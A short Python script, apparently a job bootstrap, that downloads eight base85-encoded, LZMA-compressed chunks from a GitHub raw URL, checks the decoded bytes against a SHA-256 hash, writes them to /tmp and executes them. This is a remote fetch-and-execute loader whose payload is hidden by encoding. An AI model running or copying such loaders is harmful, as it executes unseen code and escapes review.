from __future__ import annotations

import base64
import hashlib
import lzma
import runpy
import urllib.request
from pathlib import Path

BASE = "https://raw.githubusercontent.com/craigbotnen-boop/ewrhwerth/three-paper-suite/hf_jobs/fdep_c003"
EXPECTED_RUNNER_SHA256 = "bf98208d1196355e88ed51e99fe2edc3718ac7d5fb62c4bbfe3085806271b7ed"

parts: list[bytes] = []
for index in range(1, 9):
    url = f"{BASE}/chunk_{index:02d}.txt"
    with urllib.request.urlopen(url, timeout=120) as response:
        part = response.read().strip()
    print(f"TRANSFER_CHUNK_{index:02d}_BYTES={len(part)}", flush=True)
    parts.append(part)

encoded = b"".join(parts)
runner_bytes = lzma.decompress(base64.b85decode(encoded))
digest = hashlib.sha256(runner_bytes).hexdigest()
print(f"RUNNER_SHA256={digest}", flush=True)
if digest != EXPECTED_RUNNER_SHA256:
    raise SystemExit("RUNNER_HASH_MISMATCH")

runner_path = Path("/tmp/FDEP_SPIN_ICE_OPERATOR_PHASE_MAP_003_EXECUTION_001_HF_LOG_EXPORT_RUNNER.py")
runner_path.write_bytes(runner_bytes)
print(f"RUNNER_PATH={runner_path}", flush=True)
runpy.run_path(str(runner_path), run_name="__main__")
